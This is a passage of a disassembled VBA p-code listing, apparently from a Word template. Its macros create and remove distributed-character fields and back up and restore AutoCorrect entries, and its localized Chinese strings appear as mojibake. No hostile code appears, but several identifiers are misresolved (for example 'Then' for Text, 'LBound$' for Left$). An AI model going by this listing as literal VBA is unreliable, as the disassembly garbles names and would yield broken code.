0x0000 \n' \tNe \n' \tParen \n' \tIfBlock \n' Line #2645:\n' \tSetStmt \n' \tLd para \n' \tMemLd Range \n' \tSet rgn \n' Line #2646:\n' \tLd para \n' \tMemLd Range \n' \tMemLd Start \n' \tLd rgnOrg \n' \tMemLd Start \n' \tLt \n' \tParen \n' \tIfBlock \n' Line #2647:\n' \tLd rgnOrg \n' \tMemLd Start \n' \tLd rgn \n' \tMemLd End \n' \tLitDI2 0x0001 \n' \tSub \n' \tLd rgn \n' \tArgsMemCall SetRange 0x0002 \n' Line #2648:\n' \tLd para \n' \tMemLd Range \n' \tMemLd End \n' \tLd rgnOrg \n' \tMemLd End \n' \tGt \n' \tParen \n' \tElseIfBlock \n' Line #2649:\n' \tLd rgn \n' \tMemLd Start \n' \tLd rgnOrg \n' \tMemLd End \n' \tLitDI2 0x0001 \n' \tSub \n' \tLd rgn \n' \tArgsMemCall SetRange 0x0002 \n' Line #2650:\n' \tElseBlock \n' Line #2651:\n' \tLd rgn \n' \tMemLd Start \n' \tLd rgn \n' \tMemLd End \n' \tLitDI2 0x0001 \n' \tSub \n' \tLd rgn \n' \tArgsMemCall SetRange 0x0002 \n' Line #2652:\n' \tEndIfBlock \n' Line #2653:\n' \tLd rgn \n' \tArgsMemCall Set 0x0000 \n' Line #2654:\n' \tElseBlock \n' Line #2655:\n' \tSetStmt \n' \tLd rgnOrg \n' \tSet rgn \n' Line #2656:\n' \tEndIfBlock \n' Line #2657:\n' \tLitDI2 0x0001 \n' \tLd rgn \n' \tMemLd Then \n' \tLitDI2 0x000B \n' \tArgsLd Chr$ 0x0001 \n' \tFnInStr3 \n' \tSt cLineBreak \n' Line #2658:\n' \tLd cLineBreak \n' \tLitDI2 0x0000 \n' \tNe \n' \tParen \n' \tIfBlock \n' Line #2659:\n' \tLd rgn \n' \tMemLd Start \n' \tLd rgn \n' \tMemLd Start \n' \tLd cLineBreak \n' \tAdd \n' \tLitDI2 0x0001 \n' \tSub \n' \tLd rgn \n' \tArgsMemCall SetRange 0x0002 \n' Line #2660:\n' \tLd rgn \n' \tArgsMemCall Set 0x0000 \n' Line #2661:\n' \tEndIfBlock \n' Line #2662:\n' \tMemLdWith Fields \n' \tMemLd Count \n' \tLitDI2 0x0000 \n' \tGt \n' \tParen \n' \tIfBlock \n' Line #2663:\n' \tLitDI2 0x0001 \n' \tArgsMemLdWith Fields 0x0001 \n' \tMemLd Code \n' \tSt a$ \n' Line #2664:\n' \tLd a$ \n' \tArgsLd FIsDistField 0x0001 \n' \tLitVarSpecial (True)\n' \tEq \n' \tParen \n' \tIfBlock \n' Line #2665:\n' \tLitDI2 0x0001 \n' \tArgsMemLdWith Fields 0x0001 \n' \tLd n \n' \tArgsCall Resize 0x0002 \n' Line #2666:\n' \tGoTo LContinue \n' Line #2667:\n' \tEndIfBlock \n' Line #2668:\n' \tEndIfBlock \n' Line #2669:\n' Line #2670:\n' \tMemLdWith Then \n' \tFnLen \n' \tSt c \n' Line #2671:\n' \tQuoteRem 0x000C 0x0019 \" Remove Additional Spaces\"\n' Line #2672:\n' \tMemLdWith Then \n' \tSt sz$ \n' Line #2673:\n' \tLitDI2 0x0000 \n' \tSt x \n' Line #2674:\n' \tLd sz$ \n' \tLitDI2 0x0001 \n' \tArgsLd Right$ 0x0002 \n' \tArgsLd FIsSpace 0x0001 \n' \tLitDI2 0x0000 \n' \tNe \n' \tParen \n' \tWhile \n' Line #2675:\n' \tLd sz$ \n' \tLd sz$ \n' \tFnLen \n' \tLitDI2 0x0001 \n' \tSub \n' \tArgsLd LBound$ 0x0002 \n' \tSt sz$ \n' Line #2676:\n' \tLd x \n' \tLitDI2 0x0001 \n' \tAdd \n' \tSt x \n' Line #2677:\n' \tWend \n' Line #2678:\n' Line #2679:\n' \tQuoteRem 0x000C 0x0016 \" Create DistChar field\"\n' Line #2680:\n' \tQuoteRem 0x000C 0x0016 \" {eq \\o\\ad(foo,     )}\"\n' Line #2681:\n' \tSetStmt \n' \tMemLdWith Range \n' \tSet rgn \n' Line #2682:\n' \tLd x \n' \tLitDI2 0x0000 \n' \tGt \n' \tParen \n' \tIfBlock \n' Line #2683:\n' \tArgsMemCallWith MoveRight 0x0000 \n' Line #2684:\n' \tLd wdCharacter \n' \tParamNamed unit \n' \tLd x \n' \tParamNamed Count \n' \tArgsMemCallWith MoveLeft 0x0002 \n' Line #2685:\n' \tLd wdCharacter \n' \tParamNamed unit \n' \tLd x \n' \tParamNamed Count \n' \tArgsMemCallWith Delete 0x0002 \n' Line #2686:\n' \tLd rgn \n' \tArgsMemCall Set 0x0000 \n' Line #2687:\n' \tEndIfBlock \n' Line #2688:\n' \tLitStr 0x0001 \",\"\n' \tLd n \n' \tLitStr 0x0002 \"\u00a1@\"\n' \tArgsLd String$$ 0x0002 \n' \tAdd \n' \tLitStr 0x0001 \")\"\n' \tAdd \n' \tArgsMemCallWith InsertAfter 0x0001 \n' Line #2689:\n' \tLitStr 0x0009 \"eq \\o\\ad(\"\n' \tArgsMemCallWith InsertBefore 0x0001 \n' Line #2690:\n' \tLd rgn \n' \tMemLd Start \n' \tLitStr 0x0009 \"eq \\o\\ad(\"\n' \tFnLen \n' \tAdd \n' \tLd rgn \n' \tMemLd End \n' \tLd rgn \n' \tArgsMemCall SetRange 0x0002 \n' Line #2691:\n' \tLitVarSpecial (False)\n' \tLd rgn \n' \tMemLd Font \n' \tMemSt DisableCharacterSpaceGrid \n' Line #2692:\n' \tSetStmt \n' \tMemLdWith Range \n' \tSet rgn \n' Line #2693:\n' \tQuoteRem 0x000B 0x000D \" Insert Field\"\n' Line #2694:\n' \tMemLdWith Range \n' \tParamOmitted \n' \tParamOmitted \n' \tLitVarSpecial (False)\n' \tMemLdWith Fields \n' \tArgsMemCall Add 0x0004 \n' Line #2695:\n' \tQuoteRem 0x000C 0x0018 \" { eq \\o\\ad(foo,     ) }\"\n' Line #2696:\n' \tQuoteRem 0x000C 0x0028 \"                      ~ Remove tip space\"\n' Line #2697:\n' \tLd rgn \n' \tArgsMemCall Set 0x0000 \n' Line #2698:\n' \tMemLdWith Range \n' \tMemLd End \n' \tLitDI2 0x0002 \n' \tSub \n' \tMemLdWith Range \n' \tMemLd End \n' \tLitDI2 0x0001 \n' \tSub \n' \tLd rgn \n' \tArgsMemCall SetRange 0x0002 \n' Line #2699:\n' \tLitStr 0x0000 \"\"\n' \tLd rgn \n' \tMemSt Then \n' Line #2700:\n' Line #2701:\n' \tMemLdWith Fields \n' \tArgsMemCall ToggleShowCodes 0x0000 \n' Line #2702:\n' \tParamOmitted \n' \tLitDI2 0x0001 \n' \tLitDI2 0x0001 \n' \tArgsMemCallWith MoveRight 0x0003 \n' Line #2703:\n' \tLabel LContinue \n' Line #2704:\n' \tStartForVariable \n' \tLd para \n' \tEndForVariable \n' \tNextVar \n' Line #2705:\n' \tEndWith \n' Line #2706:\n' \tLd rgnOrg \n' \tArgsMemCall Set 0x0000 \n' Line #2707:\n' \tLitVarSpecial (True)\n' \tLd Application \n' \tMemSt ScreenUpdating \n' Line #2708:\n' \tLd wdCursorNormal \n' \tLd System \n' \tMemSt Cursor \n' Line #2709:\n' \tExitSub \n' Line #2710:\n' \tLabel LError \n' Line #2711:\n' \tLd Err \n' \tMemLd Description \n' \tLd SZ_MACRONAME \n' \tParamNamed Title \n' \tArgsCall MsgBox 0x0002 \n' Line #2712:\n' \tEndSub \n' Line #2713:\n' Line #2714:\n' \tQuoteRem 0x0000 0x0026 \" *************************************\"\n' Line #2715:\n' \tFuncDefn (Function FIsSpace(wh, id_FFFE As Variant))\n' Line #2716:\n' \tLd wh$ \n' \tArgsLd AscW 0x0001 \n' \tSt ch \n' Line #2717:\n' \tQuoteRem 0x0004 0x0029 \" Space DBSpace EmSpace EnSpace 1/4EmSpace\"\n' Line #2718:\n' \tLd ch \n' \tLitDI2 0x0020 \n' \tEq \n' \tLd ch \n' \tLitDI2 0x3000 \n' \tEq \n' \tOr \n' \tLd ch \n' \tLitDI2 0x2005 \n' \tEq \n' \tOr \n' \tLd ch \n' \tLitDI2 0x2002 \n' \tEq \n' \tOr \n' \tLd ch \n' \tLitDI2 0x2003 \n' \tEq \n' \tOr \n' \tIfBlock \n' Line #2719:\n' \tLd ch \n' \tSt FIsSpace \n' Line #2720:\n' \tElseBlock \n' Line #2721:\n' \tLitDI2 0x0000 \n' \tSt FIsSpace \n' Line #2722:\n' \tEndIfBlock \n' Line #2723:\n' \tEndFunc \n' Line #2724:\n' Line #2725:\n' Line #2726:\n' \tFuncDefn (Sub Delete())\n' Line #2727:\n' \tDim \n' \tVarDefn rgn (As Range)\n' Line #2728:\n' \tDim \n' \tVarDefn rgnFld (As Range)\n' Line #2729:\n' \tDim \n' \tVarDefn rgnNew (As Range)\n' Line #2730:\n' \tDim \n' \tVarDefn fld (As Field)\n' Line #2731:\n' \tDim \n' \tVarDefn FUpdate (As Boolean)\n' Line #2732:\n' Line #2733:\n' \tOnError LError \n' Line #2734:\n' \tLd Application \n' \tMemLd ScreenUpdating \n' \tLitVarSpecial (True)\n' \tEq \n' \tParen \n' \tIfBlock \n' Line #2735:\n' \tLitVarSpecial (True)\n' \tSt FUpdate \n' Line #2736:\n' \tLitVarSpecial (False)\n' \tLd Application \n' \tMemSt ScreenUpdating \n' Line #2737:\n' \tLd wdCursorWait \n' \tLd System \n' \tMemSt Cursor \n' Line #2738:\n' \tElseBlock \n' Line #2739:\n' \tLitVarSpecial (False)\n' \tSt FUpdate \n' Line #2740:\n' \tEndIfBlock \n' Line #2741:\n' Line #2742:\n' \tStartWithExpr \n' \tLd Selection \n' \tWith \n' Line #2743:\n' \tSetStmt \n' \tMemLdWith Range \n' \tSet rgn \n' Line #2744:\n' Line #2745:\n' \tMemLdWith Fields \n' \tMemLd Count \n' \tLitDI2 0x0001 \n' \tLt \n' \tParen \n' \tIfBlock \n' Line #2746:\n' \tQuoteRem 0x0000 0x0023 \"            Create (Len(.Text) + 1)\"\n' Line #2747:\n' \tArgsCall Beep 0x0000 \n' Line #2748:\n' \tGoTo LExit \n' \tBoS 0x0000 \n' Line #2749:\n' \tEndIfBlock \n' Line #2750:\n' \tStartForVariable \n' \tLd fld \n' \tEndForVariable \n' \tLd rgn \n' \tMemLd Fields \n' \tForEach \n' Line #2751:\n' \tLd fld \n' \tMemLd Code \n' \tSt a$ \n' Line #2752:\n' \tSetStmt \n' \tLd fld \n' \tMemLd Code \n' \tSet rgnFld \n' Line #2753:\n' \tLd rgnFld \n' \tMemLd Then \n' \tArgsLd FIsDistField 0x0001 \n' \tLitVarSpecial (False)\n' \tEq \n' \tParen \n' \tIfBlock \n' Line #2754:\n' \tGoTo LContinue \n' \tBoS 0x0000 \n' Line #2755:\n' \tEndIfBlock \n' Line #2756:\n' \tLd rgnFld \n' \tArgsMemCall Set 0x0000 \n' Line #2757:\n' Line #2758:\n' \tLitDI2 0x0001 \n' \tLd a$ \n' \tLitStr 0x0001 \"(\"\n' \tFnInStr3 \n' \tLd rgnFld \n' \tMemLd Start \n' \tAdd \n' \tSt iTop \n' Line #2759:\n' \tLd rgnFld \n' \tMemLd End \n' \tLd rgnFld \n' \tMemLd Then \n' \tFnLen \n' \tLitDI2 0x0001 \n' \tLd a$ \n' \tLitStr 0x0003 \",\u00a1@\"\n' \tFnInStr3 \n' \tSub \n' \tLitDI2 0x0001 \n' \tAdd \n' \tParen \n' \tSub \n' \tSt iEnd \n' Line #2760:\n' \tLd iTop \n' \tLd iEnd \n' \tLd rgnFld \n' \tArgsMemCall SetRange 0x0002 \n' Line #2761:\n' Line #2762:\n' \tArgsMemCallWith MoveLeft 0x0000 \n' Line #2763:\n' \tSetStmt \n' \tLd Selection \n' \tMemLd Range \n' \tSet rgnNew \n' Line #2764:\n' \tLd rgnFld \n' \tMemLd FormattedText \n' \tLd rgnNew \n' \tMemSt FormattedText \n' Line #2765:\n' \tLitVarSpecial (True)\n' \tLd rgnNew \n' \tMemLd Font \n' \tMemSt DisableCharacterSpaceGrid \n' Line #2766:\n' \tLd rgnNew \n' \tArgsMemCall Set 0x0000 \n' Line #2767:\n' \tArgsMemCallWith MoveRight 0x0000 \n' Line #2768:\n' \tParamOmitted \n' \tLitDI2 0x0001 \n' \tLitDI2 0x0001 \n' \tArgsMemCallWith MoveRight 0x0003 \n' Line #2769:\n' \tArgsMemCallWith Delete 0x0000 \n' Line #2770:\n' \tLabel LContinue \n' Line #2771:\n' \tStartForVariable \n' \tLd fld \n' \tEndForVariable \n' \tNextVar \n' Line #2772:\n' \tLd rgn \n' \tArgsMemCall Set 0x0000 \n' Line #2773:\n' \tEndWith \n' Line #2774:\n' \tLabel LExit \n' Line #2775:\n' \tLd FUpdate \n' \tLitVarSpecial (True)\n' \tEq \n' \tParen \n' \tIfBlock \n' Line #2776:\n' \tLitVarSpecial (True)\n' \tLd Application \n' \tMemSt ScreenUpdating \n' Line #2777:\n' \tLd wdCursorNormal \n' \tLd System \n' \tMemSt Cursor \n' Line #2778:\n' \tEndIfBlock \n' Line #2779:\n' \tExitSub \n' Line #2780:\n' \tLabel LError \n' Line #2781:\n' \tLd Err \n' \tMemLd Description \n' \tLd SZ_MACRONAME \n' \tParamNamed Title \n' \tArgsCall MsgBox 0x0002 \n' Line #2782:\n' \tEndSub \n' Line #2783:\n' Line #2784:\n' Line #2785:\n' \tFuncDefn (Sub Resize(fld As , iNew As Integer))\n' Line #2786:\n' \tLitVarSpecial (False)\n' \tLd Application \n' \tMemSt ScreenUpdating \n' Line #2787:\n' \tLd wdCursorWait \n' \tLd System \n' \tMemSt Cursor \n' Line #2788:\n' \tOnError LError \n' Line #2789:\n' \tStartWithExpr \n' \tLd Selection \n' \tWith \n' Line #2790:\n' \tDim \n' \tVarDefn rgn (As Range)\n' Line #2791:\n' \tLd fld \n' \tMemLd Code \n' \tSt a$ \n' Line #2792:\n' \tSetStmt \n' \tLd fld \n' \tMemLd Code \n' \tSet rgn \n' Line #2793:\n' Line #2794:\n' \tLd rgn \n' \tMemLd End \n' \tLd a$ \n' \tFnLen \n' \tLitDI2 0x0001 \n' \tLd a$ \n' \tLitStr 0x0003 \",\u00a1@\"\n' \tFnInStr3 \n' \tSub \n' \tParen \n' \tSub \n' \tSt iTop \n' Line #2795:\n' \tLd rgn \n' \tMemLd End \n' \tLd a$ \n' \tFnLen \n' \tLitDI2 0x0001 \n' \tLd a$ \n' \tLitStr 0x0001 \")\"\n' \tFnInStr3 \n' \tSub \n' \tLitDI2 0x0001 \n' \tAdd \n' \tParen \n' \tSub \n' \tSt iEnd \n' Line #2796:\n' \tLd iTop \n' \tLd iEnd \n' \tLd rgn \n' \tArgsMemCall SetRange 0x0002 \n' Line #2797:\n' \tLd iNew \n' \tLitStr 0x0002 \"\u00a1@\"\n' \tArgsLd String$$ 0x0002 \n' \tLd rgn \n' \tMemSt Then \n' Line #2798:\n' \tEndWith \n' Line #2799:\n' \tLabel LExit \n' Line #2800:\n' \tLitVarSpecial (True)\n' \tLd Application \n' \tMemSt ScreenUpdating \n' Line #2801:\n' \tLd wdCursorNormal \n' \tLd System \n' \tMemSt Cursor \n' Line #2802:\n' \tExitSub \n' Line #2803:\n' \tLabel LError \n' Line #2804:\n' \tLd Err \n' \tMemLd Description \n' \tLd SZ_MACRONAME \n' \tParamNamed Title \n' \tArgsCall MsgBox 0x0002 \n' Line #2805:\n' \tEndSub \n' Line #2806:\n' Line #2807:\n' Line #2808:\n' \tFuncDefn (Function FIsDistField(szFld As String, id_FFFE As Boolean) As Boolean)\n' Line #2809:\n' \tLitVarSpecial (False)\n' \tSt FIsDistField \n' Line #2810:\n' \tQuoteRem 0x0004 0x0018 \" { eq \\o\\ad(foo,\u00a1@\u00a1@\u00a1@)}\"\n' Line #2811:\n' \tQuoteRem 0x0004 0x0017 \"   ~~~~~~~~~        ~~~\"\n' Line #2812:\n' \tLd szFld \n' \tLitDI2 0x000A \n' \tArgsLd LBound$ 0x0002 \n' \tLitStr 0x000A \" eq \\o\\ad(\"\n' \tEq \n' \tParen \n' \tLd szFld \n' \tLitDI2 0x0002 \n' \tArgsLd Right$ 0x0002 \n' \tLitStr 0x0003 \"\u00a1@)\"\n' \tEq \n' \tParen \n' \tAnd \n' \tIfBlock \n' Line #2813:\n' \tLitVarSpecial (True)\n' \tSt FIsDistField \n' Line #2814:\n' \tEndIfBlock \n' Line #2815:\n' \tEndFunc \n' Line #2816:\n' Line #2817:\n' Line #2818:\n' Line #2819:\n' Line #2820:\n' Line #2821:\n' Macros/VBA/UF01 - 15394 bytes\n' Line #0:\n' Line #1:\n' Line #2:\n' Line #3:\n' Line #4:\n' Line #5:\n' Line #6:\n' Line #7:\n' \tOption  (Explicit)\n' Line #8:\n' Line #9:\n' \tQuoteRem 0x0000 0x0014 \" START LOCALIZATION'\"\n' Line #10:\n' \tDim (Const) \n' \tLitStr 0x0013 \"\u00a5[\u00a4J\u00a6\u00db\u00b0\u00ca\u00ae\u00d5\u00a5\u00bf\u00b6\u00b5\u00a5\u00d8\u00a1G \"\n' \tVarDefn StatMsg1\n' Line #11:\n' \tDim (Const) \n' \tLitStr 0x0004 \" \u00a4\u00a7 \"\n' \tVarDefn StatMsg2\n' Line #12:\n' \tDim (Const) \n' \tLitStr 0x000F \"\u00a5\u00bf\u00a6b\u00ab\u00d8\u00a5\u00df\u00bc\u00cb\u00a6\u00a1...\"\n' \tVarDefn StatMsg3\n' Line #13:\n' \tDim (Const) \n' \tLitStr 0x000B \"\u00a5\u00bf\u00a6b\u00c0x\u00a6s...\"\n' \tVarDefn StatMsg4\n' Line #14:\n' \tDim (Const) \n' \tLitStr 0x0014 \"\u00a6\u00db\u00b0\u00ca\u00ae\u00d5\u00a5\u00bf\u00b6\u00b5\u00a5\u00d8\u00b3\u00c6\u00a5\u00f7\u00a4\u00e5\u00a5\u00f3\"\n' \tVarDefn TagText\n' Line #15:\n' \tDim (Const) \n' \tLitStr 0x000E \"\u00a6\u00db\u00b0\u00ca\u00ae\u00d5\u00a5\u00bf\u00a4u\u00a8\u00e3\u00b6\u00b0\"\n' \tVarDefn szAppName\n' Line #16:\n' \tDim (Const) \n' \tLitStr 0x001C \"\u00a6\u00b3\u00bf\u00f9\u00bb~\u00b5o\u00a5\u00cd\u00a1C\u00b1z\u00adn\u00a6A\u00b8\u00d5\u00a4@\u00a6\u00b8\u00b6\u00dc\u00a1H\"\n' \tVarDefn szErrorMsg\n' Line #17:\n' \tDim (Const) \n' \tLitStr 0x0023 \"\u00a6\u00b3\u00bf\u00f9\u00bb~\u00b5o\u00a5\u00cd\u00a1C \u00a4\u00e5\u00a5\u00f3\u00aa\u00ba\u00bc\u00cb\u00a6\u00a1\u00a5i\u00af\u00e0\u00a6\u00b3\u00b0\u00dd\u00c3D\u00a1C\"\n' \tVarDefn szACEntriesErrorMsg\n' Line #18:\n' \tDim (Const) \n' \tLitStr 0x0066 \"\u00b5{\u00a6\u00a1\u00b1N\u00b1q\u00b3\u00c6\u00a5\u00f7\u00a4\u00e5\u00a5\u00f3\u00a4\u00a4\u00a8\u00fa\u00a5X\u00c0x\u00a6s\u00aa\u00ba\u00a6\u00db\u00b0\u00ca\u00ae\u00d5\u00a5\u00bf\u00b6\u00b5\u00a5\u00d8\u00a1A\u00a5\u00d8\u00abe\u00a6\u00db\u00b0\u00ca\u00ae\u00d5\u00a5\u00bf\u00b6\u00b5\u00a5\u00d8\u00a4\u00a4\u00ac\u00db\u00a6P\u00a6W\u00ba\u00d9\u00aa\u00ba\u00b3\u00a1\u00a5\u00f7\u00b1N\u00b7|\u00b3Q\u00a8\u00fa\u00a5N\u00b1\u00bc\u00a1C\u00b1z\u00c1\u00d9\u00adn\u00c4~\u00c4\u00f2\u00b6\u00dc\u00a1H\"\n' \tVarDefn szWarnMsg\n' Line #19:\n' \tDim (Const) \n' \tLitStr 0x0024 \"\u00b3o\u00a5\u00f7\u00a4\u00e5\u00a5\u00f3\u00aa\u00ba\u00bc\u00cb\u00a6\u00a1\u00a4\u00a3\u00acO\u00a5\u00bf\u00bdT\u00aa\u00ba\u00b3\u00c6\u00a5\u00f7\u00a4\u00e5\u00a5\u00f3\u00bc\u00cb\u00a6\u00a1\"\n' \tVarDefn szFormatIncorrect\n' Line #20:\n' \tDim (Const) \n' \tLitStr 0x0010 \"\u00a4w\u00a7\u00b9\u00a6\u00a8\u00ad\u00ab\u00b7s\u00b8\u00fc\u00a4J\u00a1C\"\n' \tVarDefn szRestoreCompletemsg\n' Line #21:\n' \tQuoteRem 0x0000 0x0012 \" END LOCALIZATION'\"\n' Line #22:\n' Line #23:\n' \tQuoteRem 0x0000 0x0032 \"***********   btnBackup_Click() ******************\"\n' Line #24:\n' \tQuoteRem 0x0000 0x0000 \"\"\n' Line #25:\n' \tQuoteRem 0x0000 0x004C \" Hides the form, creates a new Word document, calls GetAutoCorrectEntries(),\"\n' Line #26:\n' \tQuoteRem 0x0000 0x0048 \" adds the text \"AutoCorrect Backup Document\" at the top of the document,\"\n' Line #27:\n' \tQuoteRem 0x0000 0x002D \" and saves the document by calling SaveACDoc.\"\n' Line #28:\n' \tQuoteRem 0x0000 0x0000 \"\"\n' Line #29:\n' \tQuoteRem 0x0000 0x002A \" Uses valuable y that doesn't do anything.\"\n' Line #30:\n' Line #31:\n' \tFuncDefn (Private Sub btnBackup_Click())\n' Line #32:\n' \tDim \n' \tVarDefn Y (As Integer)\n' Line #33:\n' Line #34:\n' \tLd Autocorrect \n' \tArgsMemCall Hide 0x0000 \n' Line #35:\n' \tLitVarSpecial (False)\n' \tLd Application \n' \tMemSt ScreenUpdating \n' Line #36:\n' Line #37:\n' \tQuoteRem 0x0000 0x0013 \"create new document\"\n' Line #38:\n' \tLd Application \n' \tMemLd Documents \n' \tArgsMemCall Add 0x0000 \n' Line #39:\n' Line #40:\n' \tQuoteRem 0x0001 0x002A \" call GetAutoCorrectEntries() user defined\"\n' Line #41:\n' \tArgsLd GetAutoCorrectEntries 0x0000 \n' \tSt Y \n' Line #42:\n' Line #43:\n' \tQuoteRem 0x0000 0x001C \" add Text to top of document\"\n' Line #44:\n' \tStartWithExpr \n' \tLd Selection \n' \tWith \n' Line #45:\n' \tArgsMemCallWith SplitTable 0x0000 \n' Line #46:\n' \tLd TagText \n' \tParamNamed Then \n' \tArgsMemCallWith TypeText 0x0001 \n' Line #47:\n' \tArgsMemCallWith TypeParagraph 0x0000 \n' Line #48:\n' \tEndWith \n' Line #49:\n' Line #50:\n' \tQuoteRem 0x0000 0x0013 \"add some formatting\"\n' Line #51:\n' \tStartWithExpr \n' \tLitDI2 0x0001 \n' \tLd ActiveDocument \n' \tArgsMemLd Sentences 0x0001 \n' \tWith \n' Line #52:\n' \tLitVarSpecial (True)\n' \tMemStWith Bold \n' Line #53:\n' \tLitDI2 0x000E \n' \tMemLdWith Font \n' \tMemSt Size \n' Line #54:\n' \tEndWith \n' Line #55:\n' Line #56:\n' \tQuoteRem 0x0000 0x0045 \" Save the Document,call SaveACDoc() user defined, close if successful\"\n' Line #57:\n' \tLd StatMsg4 \n' \tLd Application \n' \tMemSt StatusBar \n' Line #58:\n' \tLd SaveACDoc \n' \tLitVarSpecial (True)\n' \tEq \n' \tIfBlock \n' Line #59:\n' \tLd wdDoNotSaveChanges \n' \tParamNamed SaveChanges \n' \tLd ActiveDocument \n' \tArgsMemCall Close 0x0001 \n' Line #60:\n' \tEndIfBlock \n' Line #61:\n' \tLitVarSpecial (True)\n' \tLd Application \n' \tMemSt ScreenUpdating \n' Line #62:\n' \tLd Autocorrect \n' \tArgsMemCall Show 0x0000 \n' Line #63:\n' \tEndSub \n' Line #64:\n' Line #65:\n' \tFuncDefn (Private Sub btnClose_Click())\n' Line #66:\n' \tLd Autocorrect \n' \tArgsMemCall Hide 0x0000 \n' Line #67:\n' \tEndSub \n' Line #68:\n' Line #69:\n' \tQuoteRem 0x0000 0x002F \"************* btnRestore_Click() **************\"\n' Line #70:\n' \tQuoteRem 0x0000 0x0000 \"\"\n' Line #71:\n' \tQuoteRem 0x0000 0x0044 \" First warns the user that this will replace their existing entries.\"\n' Line #72:\n' \tQuoteRem 0x0000 0x0046 \" If they answer no it jumps to the end of the function.  Then displays\"\n' Line #73:\n' \tQuoteRem 0x0000 0x004A \" the FileOpen dialog box to get the name of an existing AutoCorrect backup\"\n' Line #74:\n' \tQuoteRem 0x0000 0x004D \" document (creating using the Backup button.)  Next calls OpenACDoc() to open\"\n' Line #75:\n' \tQuoteRem 0x0000 0x0056 \" the file. If successful it calls RestoreACEntries(). Finally, it closes the document.\"\n' Line #76:\n' \tQuoteRem 0x0000 0x0000 \"\"\n' Line #77:\n' \tQuoteRem 0x0000 0x0000 \"\"\n' Line #78:\n' \tQuoteRem 0x0000 0x0000 \"\"\n' Line #79:\n' \tFuncDefn (Private Sub btnRestore_Click())\n' Line #80:\n' \tDim \n' \tVarDefn ACFileName\n' \tVarDefn Title (As String)\n' Line #81:\n' \tDim \n' \tVarDefn Style\n' \tVarDefn Response\n' \tVarDefn x (As Integer)\n' Line #82:\n' Line #83:\n' \tLd Autocorrect \n' \tArgsMemCall Hide 0x0000 \n' Line #84:\n' Line #85:\n' \tQuoteRem 0x0000 0x0025 \" warn users about replaced entries...\"\n' Line #86:\n' \tLd vbYesNo \n' \tLd vbInformation \n' \tAdd \n' \tLd vbDefaultButton2 \n' \tAdd \n' \tSt Style \n' \tQuoteRem 0x0033 0x0010 \" Define buttons.\"\n' Line #87:\n' \tLd szAppName \n' \tSt Title \n' Line #88:\n' \tLd szWarnMsg \n' \tLd Style \n' \tLd Title \n' \tArgsLd MsgBox 0x0003 \n' \tSt Response \n' Line #89:\n' \tLd Response \n' \tLd vbNo \n' \tEq \n' \tIfBlock \n' Line #90:\n' \tQuoteRem 0x0003 0x0004 \"exit\"\n' Line #91:\n' \tGoTo bye \n' \tBoS 0x0000 \n' Line #92:\n' \tEndIfBlock \n' Line #93:\n' Line #94:\n' \tQuoteRem 0x0000 0x0021 \" bring up fileopen and get a name\"\n' Line #95:\n' \tStartWithExpr \n' \tLd wdDialogFileOpen \n' \tArgsLd Dialogs 0x0001 \n' \tWith \n' Line #96:\n' \tArgsMemCallWith Display 0x0000 \n' Line #97:\n' \tMemLdWith New \n' \tSt ACFileName \n' Line #98:\n' \tEndWith \n' Line #99:\n' Line #100:\n' \tQuoteRem 0x0000 0x002E \" Open a Document,call OpenACDoc() user defined\"\n' Line #101:\n' \tLd ACFileName \n' \tArgsLd OpenACDoc 0x0001 \n' \tLitVarSpecial (True)\n' \tEq \n' \tIfBlock \n' \tQuoteRem 0x0025 0x0005 \"error\"\n' Line #102:\n' \tQuoteRem 0x0004 0x0036 \" Restore Entries, call RestoreACEntries() user defined\"\n' Line #103:\n' \tArgsLd RestoreACEntries 0x0000 \n' \tSt x \n' Line #104:\n' \tLd wdDoNotSaveChanges \n' \tParamNamed SaveChanges \n' \tLd ActiveDocument \n' \tArgsMemCall Close 0x0001 \n' Line #105:\n' \tEndIfBlock \n' Line #106:\n' Line #107:\n' \tLabel bye \n' Line #108:\n' \tLd Autocorrect \n' \tArgsMemCall Show 0x0000 \n' Line #109:\n' \tEndSub \n' Line #110:\n' Line #111:\n' \tFuncDefn (Function RestoreACEntries(id_FFFE As Variant))\n' Line #112:\n' \tDim \n' \tVarDefn i\n' \tVarDefn NumRows (As Integer)\n' Line #113:\n' \tDim \n' \tVarDefn oDoc\n' \tVarDefn oACorrect\n' \tVarDefn oTable (As Object)\n' Line #114:\n' Line #115:\n' \tDim \n' \tVarDefn szName (As String)\n' Line #116:\n' \tDim \n' \tVarDefn szValue (As String)\n' Line #117:\n' \tDim \n' \tVarDefn szRTF (As String)\n' Line #118:\n' Line #119:\n' \tLd Err \n' \tArgsMemCall Clear 0x0000 \n' Line #120:\n' \tOnError RestoreACEntriesErrors \n' \tBoS 0x0000 \n' Line #121:\n' Line #122:\n' \tQuoteRem 0x0004 0x0019 \" check for correct format\"\n' Line #123:\n' \tLitDI2 0x0001 \n' \tLd ActiveDocument \n' \tArgsMemLd Words 0x0001 \n' \tLd TagText \n' \tEq \n' \tIfBlock \n' Line #124:\n' \tLitVarSpecial (False)\n' \tLd Application \n' \tMemSt ScreenUpdating \n' Line #125:\n' Line #126:\n' \tSetStmt \n' \tLd ActiveDocument \n' \tSet oDoc \n' Line #127:\n' \tSetStmt \n' \tLitDI2 0x0001 \n' \tLd oDoc \n' \tArgsMemLd Tables 0x0001 \n' \tSet oTable \n' Line #128:\n' \tSetStmt \n' \tLd Application \n' \tMemLd Autocorrect \n' \tMemLd Entries \n' \tSet oACorrect \n' Line #129:\n' Line #130:\n' \tLitDI2 0x0001 \n' \tLd ActiveDocument \n' \tArgsMemLd Tables 0x0001 \n' \tMemLd Rows \n' \tMemLd Count \n' \tSt NumRows \n' Line #131:\n' \tLd wdGoToTable \n' \tParamNamed What \n' \tLd wdGoToFirst \n' \tParamNamed Which \n' \tLd Selection \n' \tArgsMemCall If 0x0002 \n' Line #132:\n' \tLd wdCell \n' \tParamNamed unit \n' \tLitDI2 0x0003 \n' \tParamNamed Count \n' \tLd Selection \n' \tArgsMemCall MoveRight 0x0002 \n' Line #133:\n' Line #134:\n' \tStartForVariable \n' \tLd i \n' \tEndForVariable \n' \tLitDI2 0x0002 \n' \tLd NumRows \n' \tFor \n' Line #135:\n' \tLd Selection \n' \tMemLd Then \n' \tSt szName \n' Line #136:\n' \tLd wdCell \n' \tParamNamed unit \n' \tLd Selection \n' \tArgsMemCall MoveRight 0x0001 \n' Line #137:\n' \tLd Selection \n' \tMemLd Then \n' \tSt szValue \n' Line #138:\n' \tLd wdCell \n' \tParamNamed unit \n' \tLd Selection \n' \tArgsMemCall MoveRight 0x0001 \n' Line #139:\n' 